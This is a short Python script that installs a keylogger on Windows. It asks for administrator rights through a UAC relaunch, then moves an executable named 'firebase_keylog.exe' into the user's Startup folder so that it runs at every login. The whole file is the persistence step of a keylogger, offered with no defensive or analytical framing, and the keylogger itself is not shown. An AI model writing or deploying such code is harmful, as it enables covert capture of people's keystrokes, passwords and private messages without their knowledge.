import os
import sys
import win32com.shell.shell as shell
import shutil
import ctypes
import getpass

# instructions to ask for admin privileges were taken from this website: 
# https://stackoverflow.com/questions/41851413/ask-for-admin-access-for-a-python-function-in-windows#42787309

# if the user is not admin, ask for admin privileges
if not ctypes.windll.shell32.IsUserAnAdmin():
    print('Not enough privilege, restarting...')
    import sys
    ctypes.windll.shell32.ShellExecuteW(
        None, 'runas', sys.executable, ' '.join(sys.argv), None, None)
    exit(0)
else:
	print('Elevated privilege acquired')

# instructions for using shutil were taken from this website: https://www.geeksforgeeks.org/how-to-move-files-and-directories-in-python/

# move the exe file of the keylog into the startup folder
src = r"dist/firebase_keylog.exe" # this assumes the exe is in dist folder which is in the current working directory
user = getpass.getuser()
dst = r'C:/Users/' + user +'/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
shutil.move(src, dst)
